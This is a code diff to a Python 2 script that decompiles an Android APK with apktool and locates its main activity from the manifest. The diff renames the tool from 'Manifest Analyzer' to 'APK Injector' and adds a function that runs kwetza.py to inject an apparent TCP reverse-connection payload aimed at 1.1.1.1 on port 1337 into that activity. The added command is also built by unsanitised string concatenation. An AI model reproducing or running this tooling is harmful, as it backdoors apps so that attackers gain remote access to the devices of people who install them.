@@ -5,16 +5,19 @@ import sys
 import os
 import subprocess
 
-soup = ""
-folder = ""
+soup    = ""
+folder  = ""
+appname = ""
+main    = ""
 
 def findPackage():
     #os.system('apktool --version')
     global soup
     global folder
+    global appname
     curr_dir = os.getcwd()
-
-    appname = sys.argv[1].split('.apk')[0]
+    arg = sys.argv[1].split('/')
+    appname = arg[len(arg)-1].split('.apk')[0]
     manifest_file = curr_dir + '/' + appname + '/AndroidManifest.xml'
     folder = curr_dir + '/' + appname
     file = open(manifest_file)
@@ -30,17 +33,25 @@ def checkMain(activity):
     if str_len <= 2:
         addPackage(activity)
     else:
-        print('Main Activity Location: ' + changeToFolder(activity))
-        print folder + '/smali/' + changeToFolder(activity)
+        global main
+        main = activity
+        print('Main Activity: ' + activity)
+        callKwetza()
 
 def addPackage(name):
     global soup
+    global main
     manifest = soup.find_all('manifest')
-    print('\r\nMain Activity Location: '+ changeToFolder(manifest[0]['package'] + name))
+    main = manifest[0]['package'] + name
+    print('\r\nMain Activity: '+ main)
     print folder + '/smali/' +  changeToFolder(manifest[0]['package'] + name)
+    callKwetza()
 
 def changeToFolder(string):
     return string.replace('.', '/')
+
+def callKwetza():
+    os.system('python kwetza.py ' + appname + ' tcp 1.1.1.1 1337 ' + main)
 
 def init():
     command = ["apktool", "d", "-f", sys.argv[1]]
@@ -50,16 +61,18 @@ def init():
         if not line:
             break
         print line
+
     findPackage()
+
 
 if __name__ == "__main__":
     sleep(0.1)
-    print("                                                                                    ")
-    print("  __  __             _  __           _        _                _                    ")
-    print(" |  \/  | __ _ _ __ (_)/ _| ___  ___| |_     / \   _ __   __ _| |_   _ _______ _ __ ")
-    print(" | |\/| |/ _` | '_ \| | |_ / _ \/ __| __|   / _ \ | '_ \ / _` | | | | |_  / _ \ '__|")
-    print(" | |  | | (_| | | | | |  _|  __/\__ \ |_   / ___ \| | | | (_| | | |_| |/ /  __/ |   ")
-    print(" |_|  |_|\__,_|_| |_|_|_|  \___||___/\__| /_/   \_\_| |_|\__,_|_|\__, /___\___|_|   ")
-    print("                                                                 |___/              ")
-    print("                                                                                    ")
+    print("                                                            ")
+    print("     _    ____  _  __  ___        _           _             ")
+    print("    / \  |  _ \| |/ / |_ _|_ __  (_) ___  ___| |_ ___  _ __ ")
+    print("   / _ \ | |_) | ' /   | || '_ \ | |/ _ \/ __| __/ _ \| '__|")
+    print("  / ___ \|  __/| . \   | || | | || |  __/ (__| || (_) | |   ")
+    print(" /_/   \_\_|   |_|\_\ |___|_| |_|/ |\___|\___|\__\___/|_|   ")
+    print("                               |__/                         ")
+    print("                                                            ")
     init()
